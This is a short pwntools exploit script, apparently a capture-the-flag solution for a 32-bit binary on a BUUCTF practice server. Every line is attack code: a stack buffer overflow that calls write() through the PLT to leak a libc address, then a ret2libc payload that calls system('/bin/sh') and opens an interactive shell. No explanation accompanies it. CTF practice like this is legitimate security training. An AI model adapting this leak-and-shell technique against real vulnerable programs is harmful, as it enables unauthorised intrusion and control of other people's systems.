from pwn import *
context(log_level='debug')
io = remote("node4.buuoj.cn",27296)
#io = process("./bof")
elf = ELF("./bof")
libc = ELF("./libc-2.23.so")
vuln = 0x080484D6
payload = 'a'*(0x6c+4) + p32(elf.plt['write'])+p32(vuln)+p32(1)+p32(elf.got['write'])+p32(4)
io.sendline(payload)
io.recvuntil("\x21\x0a")
write_addr= u32(io.recv(4))
print hex(write_addr)
base = write_addr - libc.sym['write']
sys_addr = base + libc.sym['system']
bin_sh = base + libc.search('/bin/sh').next()
payload = 'a'*(0x6c+4) +p32(sys_addr)+ p32(0xdeadbeef)+p32(bin_sh) 
io.sendline(payload)
io.interactive()